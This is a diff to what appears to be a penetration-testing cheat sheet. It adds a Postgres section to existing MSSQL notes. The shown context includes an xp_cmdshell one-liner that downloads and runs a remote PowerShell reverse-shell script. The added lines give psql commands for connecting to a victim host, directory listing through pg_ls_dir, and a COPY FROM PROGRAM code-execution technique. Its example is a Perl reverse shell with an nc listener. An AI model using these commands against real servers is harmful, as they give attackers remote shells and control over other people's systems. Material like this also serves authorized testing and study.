@@ -22,6 +22,7 @@
 - [Apache Tomcat](#Apache-Tomcat)
 - [Active Directory](#Active-Directory)
 - [MSSQL](#MSSQL)
+- [Postgres][#Postgres]
 
 --------------------------------------------------------------------------------------------------------------------------------
 
@@ -1355,4 +1356,35 @@ After this step on localmachine we should get NTLMv2 hash
 - Example Revershell for xp_cmdshell
 ```
 EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://[your_local_ip/tcp_revershell.ps1") | powershell -noprofile'
+```
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# Postgres
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+-  Connect
+```
+psql -h [victim_ip] -U <username> -p [port]
+psql -h [victim_ip] -U [username] -d [database]
+```
+- Enumerate file system
+```
+select pg_ls_dir('./')
+```
+- Postgres RCE method
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM '[Your command here]';
+DELETE FROM cmd_exec; -> Delete current command
+
+Example:
+DROP TABLE IF EXIST cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[yours machine ip:port]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+
+On machine over your control
+nc -lnvp [port]
 ```
